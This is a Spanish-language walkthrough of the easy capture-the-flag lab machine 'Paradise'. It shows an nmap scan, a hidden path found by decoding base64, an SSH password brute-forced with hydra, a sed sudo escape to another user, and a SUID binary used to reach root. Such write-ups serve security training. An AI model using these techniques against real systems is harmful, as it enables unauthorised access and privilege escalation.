Maquina: Paradise

Autor: kaikoperez

Dificultad: Facil

![Captura de pantalla 2024-12-06 172150](https://github.com/user-attachments/assets/69a39caa-a114-4ee3-9d59-54a102178aba)

Hacemos ping para ver si hay conexion

ping 172.17.0.2 -c 1

![Captura de pantalla 2024-12-06 172615](https://github.com/user-attachments/assets/11cacbae-7a20-484f-98ff-cda263738576)

Hacemos un escaneo de puertos con nmap

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

![Captura de pantalla 2024-12-06 172733](https://github.com/user-attachments/assets/78916230-0770-486a-bd70-453bb9eba54a)

Ingresamos la dirección IP en el navegador y podemos observar una página con 2 botones

![Captura de pantalla 2024-12-06 172818](https://github.com/user-attachments/assets/c83802d0-2c20-40cf-9cf9-7e3f42a4d4cb)

Si vamos a Go to the paradise y revisamos el código podemos observar que tiene un texto llamativo

![Captura de pantalla 2024-12-06 173100](https://github.com/user-attachments/assets/b4ec6579-1867-4ac8-b370-6de9814f9f26)

Esta en base 64, probamos revertir el mensaje

echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d

![Captura de pantalla 2024-12-06 173144](https://github.com/user-attachments/assets/2db0ed95-e8ce-4e0a-bbc7-f3f72b4f6a75)

Lo agregamos a la URL y nos lleva a un archivo TXT

172.17.0.2/estoesunsecreto

![Captura de pantalla 2024-12-06 173217](https://github.com/user-attachments/assets/77e56e4c-00b3-4eb8-8573-75e75b7673c6)

encontramos un posible usuario, navegamos al archivo y leemos el mensaje

![Captura de pantalla 2024-12-06 173247](https://github.com/user-attachments/assets/2293d57f-284d-4ad0-81f5-b86b7c572912)

Usamos hydra con lucas para conseguir el password

hydra -l lucas -P /usr/share/worlists/rockyou.txt ssh://172.17.0.2

![Captura de pantalla 2024-12-06 173627](https://github.com/user-attachments/assets/7364971d-9fe0-405c-a179-498a28ee86de)

Nos conectamos por ssh con las credenciales obtenidas

ssh lucas@172.17.0.2
chocolate

![Captura de pantalla 2024-12-06 173742](https://github.com/user-attachments/assets/85f1dd1b-9abb-4e98-a62e-42982ed1c931)

sudo -l

![Captura de pantalla 2024-12-06 174052](https://github.com/user-attachments/assets/123bf491-f70b-44ee-98e4-7357c225a9f2)

sudo -u andy sed -n '1e exec sh 1>&0' /etc/hosts

![Captura de pantalla 2024-12-06 174253](https://github.com/user-attachments/assets/8cb1142e-8244-4d63-b231-4403cee99240)

find / -perm -4000 -type f 2>/dev/null

![Captura de pantalla 2024-12-06 174339](https://github.com/user-attachments/assets/915e4439-dccc-4070-b230-7211299ce864)

Encontraremos dos interesantes en los que tenemos permisos de ejecución

Ejecutamos el binario /usr/local/bin/privileged_exec y descubrimos que obtenemos privilegios de root

whoami

![Captura de pantalla 2024-12-06 174513](https://github.com/user-attachments/assets/4d4d5321-c2e4-4912-ac19-202ff11b4c3d)

